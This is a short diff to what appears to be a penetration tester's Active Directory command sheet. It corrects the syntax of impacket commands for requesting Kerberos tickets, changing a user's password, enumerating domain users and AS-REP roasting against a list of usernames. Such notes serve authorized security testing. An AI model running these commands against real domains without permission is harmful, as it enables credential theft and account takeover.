@@ -296,11 +296,10 @@ KRB5_FILE="custom_krb5.conf";export KRB5_CONFIG="$PWD/$KRB5_FILE"; nano ./"$KRB5
     .$DOM = $KRB5DOM
 
 impacket-getTGT $DOM/'$USERNAME':'$PASSWORD' -dc-ip $TARGET
-export KRB5CCNAME="$USERNAME.ccache"; chmod 0600 $KRB5CCNAME
-kinit -c "$KRB5CCNAME" '$USERNAME@$KRB5DOM'
+export KRB5CCNAME="$USERNAME.ccache"; chmod 0600 $KRB5CCNAME; kinit -c "$KRB5CCNAME" '$USERNAME@$KRB5DOM'
 klist
 
-impacket-changepasswd $DC/'$USERNAME':'$PASSWORD'@$DOM -dc-ip $TARGET -newpass 'Password12345!'
+impacket-changepasswd $DOM/'$USERNAME':'$PASSWORD'@$TARGET -dc-ip $TARGET -newpass 'Password12345!'
 impacket-getST $DOM/'$USERNAME':'$PASSWORD' -dc-ip $TARGET -spn $DC
 impacket-GetADUsers $DOM/ -dc-host $DC -k -no-pass
 impacket-GetNPUsers $DOM/ -dc-ip "$TARGET" -usersfile usernames
